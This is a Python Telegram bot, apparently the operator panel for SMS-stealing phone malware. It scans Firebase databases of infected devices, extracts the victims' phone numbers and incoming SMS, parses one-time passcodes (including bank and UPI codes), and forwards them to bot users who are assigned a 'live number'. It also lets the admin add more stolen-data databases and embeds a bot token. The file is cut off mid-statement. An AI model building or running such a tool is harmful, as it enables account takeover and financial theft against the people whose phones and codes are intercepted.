#!/usr/bin/env python3
"""
OTP Forwarding Bot - Live Number System v4.0

v4.0 changes:
- SCORE SYSTEM REMOVED. Numbers are no longer ranked/scored. "Get Live Number"
  simply hands the user any currently-online, unassigned number.
- DYNAMIC FIREBASE MANAGEMENT. Admin can add/remove Firebase Realtime Database
  URLs from inside the bot. Each added URL is scanned for online devices and
  the same OTP-forwarding service is created for it automatically.
- Firebase URLs persist to firebase_urls.json so they survive restarts.
"""

import re, time, asyncio, logging, json, os, hashlib
from typing import Optional, Dict, List, Set, Tuple
from collections import defaultdict, deque
from datetime import datetime
import aiohttp
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from databases import DATABASES

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger("OTPFwd")

# ── CONFIG ───────────────────────────────────────────────────────────────────
ADMIN_ID = 8804372477
TOKEN = "8597129727:AAHZ6l73aLE_Dke3CedFkn57odm8Nu7Ua70"
FB_TIMEOUT = 20
POLL_INTERVAL = 0.5
MAX_CONCURRENT_POLL = 40
MAX_CONCURRENT_DB = 20
SMS_SEEN_MAX = 300000
AUTO_TIMEOUT = 300
HOT_WINDOW = 300
OTP_DEDUP_WINDOW = 600      # 10 minutes: same (number, code) pair ignored within this
OTP_DEDUP_MAX = 200000      # max entries in OTP dedup set
FIREBASE_STORE = "firebase_urls.json"

# ── DATA STRUCTURES ──────────────────────────────────────────────────────────
class DeviceInfo:
    __slots__ = ['dev_id', 'numbers', 'status', 'base_url', 'db_tag',
                 'sms_paths', 'keys', 'last_sms_hash', 'last_poll_time', 'poll_count',
                 'initial_scan_done']
    def __init__(self, dev_id, numbers, status, base_url, db_tag, sms_paths, keys):
        self.dev_id = dev_id
        self.numbers = numbers
        self.status = status
        self.base_url = base_url
        self.db_tag = db_tag
        self.sms_paths = sms_paths
        self.keys = keys
        self.last_sms_hash = None
        self.last_poll_time = 0
        self.poll_count = 0
        self.initial_scan_done = False

class NumberProfile:
    """Tracks OTP activity for a single number (no scoring)."""
    __slots__ = ['number', 'total_otps', 'last_otp_time', 'last_otp_code',
                 'last_otp_sender', 'otp_history', 'assigned_to']
    def __init__(self, number: str):
        self.number = number
        self.total_otps = 0
        self.last_otp_time = 0.0
        self.last_otp_code = ""
        self.last_otp_sender = ""
        self.otp_history: deque = deque(maxlen=50)
        self.assigned_to: Optional[int] = None

    def record_otp(self, code: str, sender: str = "", is_initial_scan: bool = False):
        """Record an OTP. Returns True if this is a genuinely new (number,code) pair."""
        # ── GLOBAL DEDUP CHECK ──
        # Backstop: if (number, code) was seen recently, skip entirely
        if not is_initial_scan:
            if not otp_code_seen(self.number, code):
                return False  # Already seen this code for this number recently

        now = time.time()
        self.total_otps += 1
        self.last_otp_code = code
        self.last_otp_sender = sender

        if is_initial_scan:
            # Historical OTPs — don't pollute otp_history or last_otp_time
            pass
        else:
            # Genuinely new OTP — track in history
            self.last_otp_time = now
            self.otp_history.append(now)

        return True

    @property
    def seconds_since_last_otp(self) -> float:
        if self.last_otp_time == 0:
            return 999999
        return time.time() - self.last_otp_time

    @property
    def recent_otp_count(self) -> int:
        now = time.time()
        return sum(1 for t in self.otp_history if now - t < HOT_WINDOW)

    @property
    def live_status_emoji(self) -> str:
        if self.last_otp_time == 0:
            return "\U0001F480"
        secs = time.time() - self.last_otp_time
        if secs < 60:
            return "\U0001F525"
        elif secs < 300:
            return "\U0001F7E2"
        elif secs < 900:
            return "\U0001F7E1"
        elif secs < 3600:
            return "\U0001F7E0"
        else:
            return "\U0001F480"

# ── GLOBAL STATE ─────────────────────────────────────────────────────────────
ALL_DEVICES: List[DeviceInfo] = []
NUM_TO_DEVICES: Dict[str, List[DeviceInfo]] = defaultdict(list)
ALL_ONLINE_NUMBERS: Set[str] = set()
NUMBER_PROFILES: Dict[str, NumberProfile] = {}
USER_WAITING: Dict[int, str] = {}
USER_WAIT_TIME: Dict[int, float] = {}
SEEN_SMS: Set[str] = set()
_seen_sms_list: List[str] = []
_seen_sms_max = SMS_SEEN_MAX

# ── OTP CODE DEDUP ───────────────────────────────────────────────────────────
# Global dedup: (number, code) → prevents same (number, code) pair from being
# recorded multiple times within OTP_DEDUP_WINDOW seconds
_OTP_CODE_SEEN: Dict[Tuple[str, str], float] = {}  # (number, code) → timestamp

def otp_code_seen(number: str, code: str) -> bool:
    """
    Check if this (number, code) pair is genuinely new.
    Returns True if new (should be recorded), False if duplicate (should be skipped).
    Also cleans up old entries.
    """
    key = (number, code)
    now = time.time()

    if key in _OTP_CODE_SEEN:
        last_time = _OTP_CODE_SEEN[key]
        if now - last_time < OTP_DEDUP_WINDOW:
            return False  # Duplicate within window — skip

    # New or expired — mark as seen
    _OTP_CODE_SEEN[key] = now

    # Periodic cleanup: remove entries older than OTP_DEDUP_WINDOW
    if len(_OTP_CODE_SEEN) > OTP_DEDUP_MAX:
        cutoff = now - OTP_DEDUP_WINDOW
        expired_keys = [k for k, v in _OTP_CODE_SEEN.items() if v < cutoff]
        for k in expired_keys:
            del _OTP_CODE_SEEN[k]

    return True

_allowed_users: Set[int] = {ADMIN_ID}
_session: Optional[aiohttp.ClientSession] = None
_app: Optional[Application] = None
_scan_done = False
_scan_running = False
_initial_sms_scan_done = False
_user_list: Dict[int, List[Tuple[str, NumberProfile]]] = {}
_user_page: Dict[int, int] = {}

# ── FIREBASE URL MANAGEMENT ──────────────────────────────────────────────────
# Admin-added Firebase Realtime Database URLs. Each entry:
#   {"url": "https://xxx.firebaseio.com", "keys": ["optional-auth-key", ...]}
_firebase_urls: List[Dict] = []
# Per-URL scan stats: tag → {"devices": int, "online": int, "numbers": int}
_firebase_stats: Dict[str, Dict] = {}
# Pending admin input state: uid → "add_url" | "add_key" | "remove"
_admin_state: Dict[int, str] = {}
_pending_url: Dict[int, str] = {}

def load_firebase_urls():
    """Load admin-added Firebase URLs from disk."""
    global _firebase_urls
    try:
        if os.path.exists(FIREBASE_STORE):
            with open(FIREBASE_STORE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                _firebase_urls = [d for d in data if isinstance(d, dict) and d.get("url")]
                logger.info(f"Loaded {len(_firebase_urls)} saved Firebase URL(s)")
    except Exception as e:
        logger.warning(f"Could not load {FIREBASE_STORE}: {e}")

def save_firebase_urls():
    """Persist admin-added Firebase URLs to disk."""
    try:
        with open(FIREBASE_STORE, "w", encoding="utf-8") as f:
            json.dump(_firebase_urls, f, indent=2)
    except Exception as e:
        logger.warning(f"Could not save {FIREBASE_STORE}: {e}")

def all_databases() -> Dict[str, Dict]:
    """Merge the built-in DATABASES with admin-added Firebase URLs."""
    merged: Dict[str, Dict] = {}
    for tag, cfg in DATABASES.items():
        merged[tag] = cfg
    for i, entry in enumerate(_firebase_urls):
        url = entry.get("url", "").rstrip("/")
        if not url:
            continue
        tag = f"custom_{i+1}"
        merged[tag] = {"url": url, "keys": entry.get("keys", []) or []}
    return merged

def parse_firebase_url(raw: str) -> Optional[str]:
    """Normalise a user-supplied Firebase URL. Returns base URL or None."""
    if not raw:
        return None
    raw = raw.strip()
    if not raw.lower().startswith("http"):
        raw = "https://" + raw
    # Strip trailing .json / slashes
    raw = raw.rstrip("/")
    if raw.endswith(".json"):
        raw = raw[:-5]
    # Basic sanity: must contain a dot (domain)
    if "." not in raw.split("//", 1)[-1]:
        return None
    return raw

def seen_add(sid: str):
    if sid not in SEEN_SMS:
        SEEN_SMS.add(sid)
        _seen_sms_list.append(sid)
        if len(_seen_sms_list) > _seen_sms_max:
            old = _seen_sms_list[:_seen_sms_max // 2]
            for o in old:
                SEEN_SMS.discard(o)
            del _seen_sms_list[:_seen_sms_max // 2]

# ── SSL / SESSION ────────────────────────────────────────────────────────────
async def get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=300, keepalive_timeout=30)
        )
    return _session

# ── FIREBASE GET ─────────────────────────────────────────────────────────────
async def fb_get(path: str, base: str, keys: list, retries: int = 2) -> Optional[dict]:
    s = await get_session()
    urls = []
    if not keys:
        urls.append(f"{base}/{path}.json" if path else f"{base}/.json")
    else:
        for k in keys:
            urls.append(f"{base}/{path}.json?auth={k}" if path else f"{base}/.json?auth={k}")

    for attempt in range(retries):
        for url in urls:
            try:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=FB_TIMEOUT)) as r:
                    if r.status == 200:
                        data = await r.json(content_type=None)
                        if isinstance(data, dict):
                            return data
                        return None
                    elif r.status == 401:
                        continue
                    elif r.status == 404:
                        return None
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
            except Exception:
                pass
        if attempt < retries - 1:
            await asyncio.sleep(0.2 * (attempt + 1))
    return None

# ── EXTRACTION ───────────────────────────────────────────────────────────────
KEYS_CHECK = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
              "mobNo", "phoneNumber", "phone", "mobile"]

def extract_nums(*dicts) -> List[str]:
    nums = []
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in KEYS_CHECK:
            v = str(d.get(k, ""))
            c = re.sub(r"\D", "", v)
            if len(c) >= 10:
                nums.append(c[-10:])
    return list(set(nums))

def extract_otp(body: str) -> Optional[str]:
    """Extract OTP code from SMS body. Tightened to reduce false positives."""
    # Priority 1: Keyword-based match (most reliable)
    kw_match = re.search(
        r"(?:otp|verif(?:ication|y)?|code|pin|passcode|token|one.time|secret)"
        r"[^\d]{0,20}(\d{4,8})\b",
        body, re.I
    )
    if kw_match:
        return kw_match.group(1)

    # Priority 2: Branded service match
    branded_match = re.search(
        r"(?:whatsapp|google|facebook|fb|amazon|flipkart|instagram|twitter|telegram"
        r"|bank|paytm|phonepe|gpay|upi|sbm|hdfc|icici|axis|sbi|pnb|bob)"
        r"[^\d]{0,30}(\d{4,6})\b",
        body, re.I
    )
    if branded_match:
        return branded_match.group(1)

    # Priority 3: Fallback — only if SMS is short (likely OTP message)
    # Skip long messages — they often contain amounts, IDs, etc.
    if len(body) > 200:
        return None
    fallback = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
    if fallback:
        code = fallback.group(1)
        # Filter obvious non-OTP patterns
        try:
            val = int(code)
            # Years
            if 1900 <= val <= 2099:
                return None
            # Round numbers (amounts: 50000, 70000, 33500)
            if val % 1000 == 0 or val % 500 == 0:
                return None
            # Very low 4-digit (dates, times: 1000-1299)
            if val < 1300 and len(code) == 4:
                return None
        except:
            pass
        return code

    return None

# ── ADMIN ────────────────────────────────────────────────────────────────────
async def send_admin(text: str):
    if _app:
        try:
            await _app.bot.send_message(ADMIN_ID, text[:4000])
        except: pass

# ── KEYBOARD BUILDERS ────────────────────────────────────────────────────────
# Reply-keyboard button labels (must match the text routing in handle_message)
BTN_GET = "\U0001F525 Get Live Number"
BTN_MY = "\U0001F50D My Status"
BTN_CANCEL = "\u274C Cancel"
BTN_STATUS = "\U0001F4CA Status"
BTN_RESCAN = "\U0001F504 Rescan"
BTN_LIVENUMS = "\U0001F525 Live Numbers"
BTN_DEADNUMS = "\U0001F480 Dead Numbers"
BTN_TOPNUMS = "\U0001F4C8 Top Numbers"
BTN_MENU = "\U0001F3E0 Menu"
BTN_PREV = "\u2B05\uFE0F Prev"
BTN_NEXT = "\u27A1\uFE0F Next"
BTN_STOP = "\u274C Stop Waiting"
BTN_NEWNUM = "\U0001F525 Get New Number"
BTN_ADDFB = "\u2795 Add Firebase"
BTN_FBLIST = "\U0001F4C1 Firebase List"
BTN_RMFB = "\U0001F5D1 Remove Firebase"

def _kb(rows, placeholder="Choose an option"):
    return ReplyKeyboardMarkup(rows, resize_keyboard=True, is_persistent=True,
                               input_field_placeholder=placeholder)

def main_keyboard(is_admin=False):
    rows = [
        [KeyboardButton(BTN_GET)],
        [KeyboardButton(BTN_MY), KeyboardButton(BTN_CANCEL)],
    ]
    if is_admin:
        rows.append([KeyboardButton(BTN_STATUS), KeyboardButton(BTN_RESCAN)])
        rows.append([KeyboardButton(BTN_LIVENUMS), KeyboardButton(BTN_DEADNUMS)])
        rows.append([KeyboardButton(BTN_TOPNUMS)])
        rows.append([KeyboardButton(BTN_ADDFB), KeyboardButton(BTN_FBLIST)])
        rows.append([KeyboardButton(BTN_RMFB)])
    return _kb(rows)

def live_number_keyboard(numbers: List[Tuple[str, NumberProfile]], page=0, per_page=10):
    rows = []
    start = page * per_page
    end = min(start + per_page, len(numbers))
    for i in range(start, end):
        num, prof = numbers[i]
        emoji = prof.live_status_emoji
        secs = int(prof.seconds_since_last_otp)
        if secs < 60:
            time_str = f"{secs}s ago"
        elif secs < 3600:
            time_str = f"{secs // 60}m ago"
        else:
            time_str = f"{secs // 3600}h ago"
        label = f"{emoji} +91{num} | {time_str}"
        if prof.assigned_to:
            label += " [BUSY]"
        rows.append([KeyboardButton(label)])
    nav = []
    if page > 0:
        nav.append(KeyboardButton(BTN_PREV))
    if end < len(numbers):
        nav.append(KeyboardButton(BTN_NEXT))
    if nav:
        rows.append(nav)
    rows.append([KeyboardButton(BTN_MENU)])
    return _kb(rows, "Tap a number to assign")

def back_keyboard():
    return _kb([[KeyboardButton(BTN_MENU)]])

def otp_received_keyboard(num=None):
    rows = [
        [KeyboardButton(BTN_STOP)],
        [KeyboardButton(BTN_NEWNUM), KeyboardButton(BTN_MENU)],
    ]
    return _kb(rows)

# ── DATABASE SCANNER ─────────────────────────────────────────────────────────
async def scan_all_databases():
    global ALL_DEVICES, NUM_TO_DEVICES, ALL_ONLINE_NUMBERS, NUMBER_PROFILES, _scan_done, _scan_running, _firebase_stats
    if _scan_running:
        return
    _scan_running = True
    logger.info("Starting full database scan...")
    sem = asyncio.Semaphore(MAX_CONCURRENT_DB)
    all_devs = []
    stats: Dict[str, Dict] = {}

    async def scan_one(tag, cfg):
        async with sem:
            dev_count = 0
            online_count = 0
            num_count = 0
            try:
                sim_r, dev_r, usr_r = await asyncio.gather(
                    fb_get("All_Users/simDetails", cfg["url"], cfg["keys"]),
                    fb_get("All_Users/Data/DeviceInfo", cfg["url"], cfg["keys"]),
                    fb_get("user_data", cfg["url"], cfg["keys"]),
                    return_exceptions=True
                )
                if isinstance(sim_r, dict):
                    info_r = dev_r if isinstance(dev_r, dict) else {}
                    for did, sim in sim_r.items():
                        if not isinstance(sim, dict): continue
                        info = info_r.get(did) if isinstance(info_r, dict) else {}
                        if not isinstance(info, dict): info = {}
                        nums = extract_nums(sim, info)
                        st = "online" if str(info.get("Status", "")).lower() == "online" else "offline"
                        if nums:
                            all_devs.append(DeviceInfo(did, nums, st, cfg["url"], tag,
                                [f"All_Users/sms/{did}"], cfg["keys"]))
                            dev_count += 1
                            num_count += len(nums)
                            if st == "online":
                                online_count += 1
                if isinstance(usr_r, dict):
                    for did, data in usr_r.items():
                        if not isinstance(data, dict): continue
                        nums = extract_nums(data)
                        st = "online" if str(data.get("status", "")).lower() == "online" else "offline"
                        if nums:
                            all_devs.append(DeviceInfo(did, nums, st, cfg["url"], tag,
                                [f"user_sms/{did}", f"All_Users/sms/{did}"], cfg["keys"]))
                            dev_count += 1
                            num_count += len(nums)
                            if st == "online":
                                online_count += 1
            except Exception as e:
                logger.debug(f"scan_one {tag}: {e}")
            stats[tag] = {"devices": dev_count, "online": online_count, "numbers": num_count}

    tasks = [scan_one(t, c) for t, c in all_databases().items()]
    await asyncio.gather(*tasks, return_exceptions=True)

    ALL_DEVICES = all_devs
    NUM_TO_DEVICES.clear()
    online_nums = set()
    for d in ALL_DEVICES:
        for n in d.numbers:
            NUM_TO_DEVICES[n].append(d)
        if d.status == "online":
            for n in d.numbers:
                online_nums.add(n)

    ALL_ONLINE_NUMBERS = online_nums

    new_profiles = {}
    for n in online_nums:
        if n in NUMBER_PROFILES:
            new_profiles[n] = NUMBER_PROFILES[n]
        else:
            new_profiles[n] = NumberProfile(n)
    NUMBER_PROFILES = new_profiles

    # Store per-URL stats for the Firebase List view
    _firebase_stats = stats

    _scan_done = True
    _scan_running = False
    online_devs = sum(1 for d in ALL_DEVICES if d.status == "online")
    logger.info(f"Scan done: {len(ALL_DEVICES)} devs, {online_devs} online, {len(online_nums)} numbers")
    await send_admin(
        f"\u2705 Scan complete!\n"
        f"Devices: {online_devs} online / {len(ALL_DEVICES)} total\n"
        f"Numbers: {len(online_nums)} total\n\n"
        f"Now doing initial SMS scan...")

# ── INITIAL SMS SCAN ─────────────────────────────────────────────────────────
async def initial_sms_scan():
    """
    Scan ALL historical SMS once at startup to:
    1. Pre-seed SEEN_SMS so we don't re-process old messages
    2. Pre-seed _OTP_CODE_SEEN so we don't re-score old OTP codes
    """
    global _initial_sms_scan_done
    if _initial_sms_scan_done:
        return

    logger.info("Starting initial SMS scan (pre-seeding)...")
    online_devs = [d for d in ALL_DEVICES if d.status == "online"]
    sem = asyncio.Semaphore(MAX_CONCURRENT_DB)

    total_sms = 0
    total_otps = 0

    async def scan_device_sms(dev: DeviceInfo):
        nonlocal total_sms, total_otps
        async with sem:
            hash_parts = []
            for sms_path in dev.sms_paths:
                data = await fb_get(sms_path, dev.base_url, dev.keys)
                if not isinstance(data, dict):
                    hash_parts.append("")
                    continue

                hash_parts.append(str(sorted(data.items())))

                for sms_key, sms in data.items():
                    if not isinstance(sms, dict):
                        continue

                    sid = f"{dev.db_tag}/{dev.dev_id}/{sms_path}/{sms_key}"
                    seen_add(sid)
                    total_sms += 1

                    body = str(sms.get("body") or sms.get("message") or sms.get("text") or sms.get("msg") or "")
                    sender = str(sms.get("sender") or sms.get("from") or sms.get("address") or "")

                    otp = extract_otp(body)
                    if not otp:
                        continue

                    total_otps += 1
                    for num in dev.numbers:
                        if num in NUMBER_PROFILES:
                            NUMBER_PROFILES[num].record_otp(otp, sender, is_initial_scan=True)
                            # Pre-seed the OTP code dedup so these codes aren't re-scored
                            _OTP_CODE_SEEN[(num, otp)] = time.time()

            if any(p for p in hash_parts):
                combined = "|".join(hash_parts)
                dev.last_sms_hash = hashlib.md5(combined.encode()).hexdigest()

            dev.initial_scan_done = True

    batch_size = MAX_CONCURRENT_DB
    for i in range(0, len(online_devs), batch_size):
        batch = online_devs[i:i+batch_size]
        await asyncio.gather(*[scan_device_sms(d) for d in batch], return_exceptions=True)

    _initial_sms_scan_done = True

    logger.info(f"Initial SMS scan done: {total_sms} SMS seen, {total_otps} historical OTPs found, {_len_otp_dedup()} OTP dedup entries")
    await send_admin(
        f"\u2705 Initial SMS scan complete!\n"
        f"\U0001F4E9 {total_sms} historical SMS pre-seeded\n"
        f"\U0001F511 {total_otps} historical OTPs found\n"
        f"\U0001F512 {_len_otp_dedup()} OTP dedup entries\n\n"
        f"\u26A1 Bot is now LIVE and monitoring for NEW OTPs!")

def _len_otp_dedup() -> int:
    return len(_OTP_CODE_SEEN)

# ── NUMBER SELECTION ─────────────────────────────────────────────────────────
def get_available_number() -> Optional[str]:
    """Return any online, unassigned number. No scoring/ranking."""
    for n, prof in NUMBER_PROFILES.items():
        if prof.assigned_to is None:
            return n
    return None

def get_all_numbers() -> List[Tuple[str, NumberProfile]]:
    """All unassigned numbers (insertion order)."""
    return [(n, p) for n, p in NUMBER_PROFILES.items() if p.assigned_to is None]

# ── BACKGROUND SMS MONITOR ───────────────────────────────────────────────────
async def monitor_sms_for_device(dev: DeviceInfo, is_initial_phase: bool = False):
    """Poll SMS from one device, update number profiles with OTP activity."""
    hash_parts = []
    new_sms_list = []

    for sms_path in dev.sms_paths:
        data = await fb_get(sms_path, dev.base_url, dev.keys)
        if isinstance(data, dict):
            hash_parts.append(str(sorted(data.items())))

            for sms_key, sms in data.items():
                if not isinstance(sms, dict):
                    continue
                sid = f"{dev.db_tag}/{dev.dev_id}/{sms_path}/{sms_key}"
                if sid in SEEN_SMS:
                    continue
                seen_add(sid)
                new_sms_list.append(sms)
        else:
            hash_parts.append("")

    if not hash_parts or all(p == "" for p in hash_parts):
        return

    combined = "|".join(hash_parts)
    data_hash = hashlib.md5(combined.encode()).hexdigest()
    if data_hash == dev.last_sms_hash and not new_sms_list:
        return
    dev.last_sms_hash = data_hash

    for sms in new_sms_list:
        body = str(sms.get("body") or sms.get("message") or sms.get("text") or sms.get("msg") or "")
        sender = str(sms.get("sender") or sms.get("from") or sms.get("address") or "")
        timestamp = str(sms.get("date") or sms.get("time") or sms.get("timestamp") or "")

        otp = extract_otp(body)
        if not otp:
            continue

        # record_otp checks _OTP_CODE_SEEN internally — duplicate (number, code) pairs are skipped
        numbers_notified = []
        for num in dev.numbers:
            if num in NUMBER_PROFILES:
                was_new = NUMBER_PROFILES[num].record_otp(otp, sender, is_initial_scan=False)
                if was_new:
                    numbers_notified.append(num)

        if numbers_notified:
            nums_str = ", ".join(f"+91{n}" for n in numbers_notified)
            logger.info(f"\U0001F525 NEW OTP: code={otp} \u2192 {nums_str}")

        # Forward to waiting users
        for num in dev.numbers:
            for uid, wnum in list(USER_WAITING.items()):
                if wnum == num and _app:
                    logger.info(f"\U0001F4E7 Forward match: +91{num} for user {uid} (waiting for +91{wnum})")
                    try:
                        await _app.bot.send_message(uid,
                            f"\u26A1 OTP RECEIVED!\n\n"
                            f"\U0001F4F1 Number: +91{num}\n"
                            f"\U0001F511 OTP: <code>{otp}</code>\n"
                            f"\U0001F4E4 Sender: {sender}\n"
                            f"\U0001F4AC Message: {body[:300]}\n"
                            f"\U0001F550 Time: {timestamp}\n\n"
                            f"\u26A1 Delivered instantly!\n"
                            f"\U0001F4E9 More OTPs will be forwarded as they arrive.",
                            parse_mode="HTML", reply_markup=otp_received_keyboard(num))
                        logger.info(f"OTP forwarded: +91{num} -> user {uid}")
                    except Exception as e:
                        logger.warning(f"Failed to forward OTP to {uid}: {e}")
                    # Keep user in USER_WAITING — they'll keep receiving OTPs
                    # until they cancel or time out

async def background_monitor_loop():
    """Continuously monitor ALL online devices for OTP activity."""
    await asyncio.sleep(5)
    logger.info("Background monitor loop started")
    cycle = 0
    while True:
        try:
            if not ALL_DEVICES:
                await asyncio.sleep(3)
                continue

            if not _initial_sms_scan_done:
                await asyncio.sleep(1)
                continue

            # ── PHASE 1: Poll devices ──
            online_devs = [d for d in ALL_DEVICES if d.status == "online"]
            waiting_nums = set(USER_WAITING.values())

            if waiting_nums and cycle % 30 == 0:  # Log every 30 cycles
                logger.info(f"\U0001F440 Waiting numbers: {waiting_nums}")

            priority_devs = [d for d in online_devs if any(n in waiting_nums for n in d.numbers)]
            other_devs = [d for d in online_devs if d not in priority_devs]

            sem = asyncio.Semaphore(MAX_CONCURRENT_POLL)

            if priority_devs:
                async def poll_p(dev):
                    async with sem:
                        await monitor_sms_for_device(dev)
                await asyncio.gather(*[poll_p(d) for d in priority_devs], return_exceptions=True)

            batch_size = MAX_CONCURRENT_POLL
            if other_devs:
                start_idx = (cycle * batch_size) % len(other_devs) if other_devs else 0
                batch = other_devs[start_idx:start_idx + batch_size]
                if len(batch) < batch_size and len(other_devs) > batch_size:
                    remaining = batch_size - len(batch)
                    batch += other_devs[:remaining]

                if batch:
                    async def poll_o(dev):
                        async with sem:
                            await monitor_sms_for_device(dev)
                    await asyncio.gather(*[poll_o(d) for d in batch], return_exceptions=True)

            cycle += 1

            # ── PHASE 2: Auto-timeout ──
            now = time.time()
            expired = [(uid, num) for uid, num in USER_WAITING.items()
                       if uid in USER_WAIT_TIME and now - USER_WAIT_TIME[uid] > AUTO_TIMEOUT]
            for uid, num in expired:
                if uid in USER_WAITING and USER_WAITING[uid] == num:
                    del USER_WAITING[uid]
                    USER_WAIT_TIME.pop(uid, None)
                    if num in NUMBER_PROFILES:
                        NUMBER_PROFILES[num].assigned_to = None
                    try:
                        await _app.bot.send_message(uid,
                            f"\u23F0 Timed out waiting for OTP on +91{num}",
                            reply_markup=main_keyboard(uid == ADMIN_ID))
                    except: pass

            # ── PHASE 3: Admin status ──
            if cycle % 600 == 0:
                in_use = sum(1 for p in NUMBER_PROFILES.values() if p.assigned_to is not None)
                await send_admin(
                    f"\U0001F4CA Monitor running ({cycle} cycles)\n"
                    f"\U0001F4F1 Numbers: {len(NUMBER_PROFILES)} | \U0001F512 In use: {in_use}\n"
                    f"\U0001F4E9 SMS seen: {len(SEEN_SMS)}\n"
                    f"\U0001F512 OTP dedup: {_len_otp_dedup()}\n"
                    f"\u23F3 Waiting: {len(USER_WAITING)}")

        except Exception as e:
            logger.error(f"Monitor loop error: {e}")

        await asyncio.sleep(POLL_INTERVAL)

# ── MESSAGE HANDLER (reply-keyboard routing) ─────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return
    uid = update.effective_chat.id
    text = msg.text.strip()
    is_admin = (uid == ADMIN_ID)

    if uid not in _allowed_users:
        await msg.reply_text("\u26D4 Not authorized. Contact admin.")
        return

    # ── ADMIN INPUT FLOW (add/remove firebase) ──
    if is_admin and uid in _admin_state:
        state = _admin_state[uid]
        if state == "add_url":
            url = parse_firebase_url(text)
            if not url:
                await msg.reply_text("\u274C Invalid URL. Send a valid Firebase URL "
                                     "(e.g. https://myapp.firebaseio.com) or /cancel.",
                                     reply_markup=main_keyboard(is_admin))
                return
            _pending_url[uid] = url
            _admin_state[uid] = "add_key"
            await msg.reply_text(
                f"\U0001F517 URL: {url}\n\n"
                f"Now send the auth key (database secret) if required, "
                f"or send `-` to skip.",
                reply_markup=back_keyboard())
            return
        if state == "add_key":
            url = _pending_url.pop(uid, None)
            _admin_state.pop(uid, None)
            if not url:
                await msg.reply_text("\u274C Something went wrong. Try again.",
                                     reply_markup=main_keyboard(is_admin))
                return
            keys = [] if text.strip() in ("-", "skip", "none", "") else [text.strip()]
            # Avoid duplicates
            if any(e.get("url") == url for e in _firebase_urls):
                await msg.reply_text("\u26A0\uFE0F This URL is already added.",
                                     reply_markup=main_keyboard(is_admin))
                return
            _firebase_urls.append({"url": url, "keys": keys})
            save_firebase_urls()
            await msg.reply_text(
                f"\u2705 Firebase added!\n\U0001F517 {url}\n"
                f"\U0001F511 Keys: {len(keys)}\n\n"
                f"\U0001F504 Scanning it now for online devices...",
                reply_markup=main_keyboard(is_admin))
            asyncio.create_task(scan_all_databases())
            return
        if state == "remove":
            _admin_state.pop(uid, None)
            idx = None
            m = re.search(r"\d+", text)
            if m:
                idx = int(m.group()) - 1
            if idx is None or idx < 0 or idx >= len(_firebase_urls):
                await msg.reply_text("\u274C Invalid number. Send /cancel to abort.",
                                     reply_markup=main_keyboard(is_admin))
                return
            removed = _firebase_urls.pop(idx)
            save_firebase_urls()
            await msg.reply_text(
                f"\u2705 Removed:\n\U0001F517 {removed.get('url')}\n\n"
                f"\U0001F504 Rescanning remaining databases...",
                reply_markup=main_keyboard(is_admin))
            asyncio.create_task(scan_all_databases())
            return

    # ── BACK TO MAIN ──
    if text == BTN_MENU:
        if not _scan_done:
            await msg.reply_text("\u23F3 System scanning... Please wait.",
                                 reply_markup=back_keyboard())
        else:
            avail = sum(1 for n, p in NUMBER_PROFILES.items() if p.assigned_to is None)
            await msg.reply_text(
                f"\U0001F916 OTP Forwarding Bot\n\n"
                f"\U0001F4F1 Available Numbers: {avail}\n"
                f"\U0001F465 Waiting: {len(USER_WAITING)}\n"
                f"\U0001F4C8 Total Numbers: {len(NUMBER_PROFILES)}\n\n"
                f"Tap a button below \U0001F447",
                reply_markup=main_keyboard(is_admin))
        return

    # ── GET LIVE NUMBER ──
    if text in (BTN_GET, BTN_NEWNUM):
        if not _scan_done:
            await msg.reply_text("\u23F3 Scanning... wait a moment.",
                                 reply_markup=back_keyboard())
            return
        if not _initial_sms_scan_done:
            await msg.reply_text("\u23F3 Initial SMS scan in progress... Almost ready!",
                                 reply_markup=back_keyboard())
            return
        if uid in USER_WAITING:
            num = USER_WAITING[uid]
            elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
            remaining = max(0, AUTO_TIMEOUT - elapsed)
            await msg.reply_text(
                f"\u23F3 Already waiting for +91{num}\n"
                f"\u23F1 Time remaining: {int(remaining)}s\n\n"
                f"Cancel first to get a different number.",
                reply_markup=_kb([
                    [KeyboardButton(BTN_CANCEL)],
                    [KeyboardButton(BTN_MENU)]
                ]))
            return

        num = get_available_number()
        if not num:
            await msg.reply_text(
                "\u274C No available numbers right now.\nTry rescan later.",
                reply_markup=back_keyboard())
            return

        prof = NUMBER_PROFILES[num]
        prof.assigned_to = uid
        USER_WAITING[uid] = num
        USER_WAIT_TIME[uid] = time.time()
        logger.info(f"\U0001F4CB User {uid} assigned number +91{num}")
        logger.info(f"\U0001F4CB USER_WAITING now: {dict(USER_WAITING)}")

        devs = NUM_TO_DEVICES.get(num, [])
        online_panels = sum(1 for d in devs if d.status == "online")
        secs = int(prof.seconds_since_last_otp)
        if secs < 60:
            last_str = f"{secs}s ago"
        elif secs < 3600:
            last_str = f"{secs // 60}m ago"
        else:
            last_str = "waiting"

        emoji = prof.live_status_emoji
        status_text = {
            "\U0001F525": "\U0001F525 HOT - OTP just now!",
            "\U0001F7E2": "\U0001F7E2 LIVE - OTP recently!",
            "\U0001F7E1": "\U0001F7E1 WARM - OTP incoming",
            "\U0001F7E0": "\U0001F7E0 COOLING - Slow activity",
            "\U0001F480": "\U0001F480 IDLE - Waiting for activity"
        }.get(emoji, "Unknown")

        await msg.reply_text(
            f"\U0001F4F1 Number Assigned!\n\n"
            f"Number: +91{num}\n"
            f"{status_text}\n"
            f"\U0001F511 Last OTP: {last_str}\n"
            f"\U0001F4C8 Recent OTPs (5m): {prof.recent_otp_count}\n"
            f"\U0001F4BB Live Panels: {online_panels}\n\n"
            f"\u26A1 I'm watching for SMS now!\n"
            f"\u23F1 Timeout: 5 minutes",
            reply_markup=_kb([
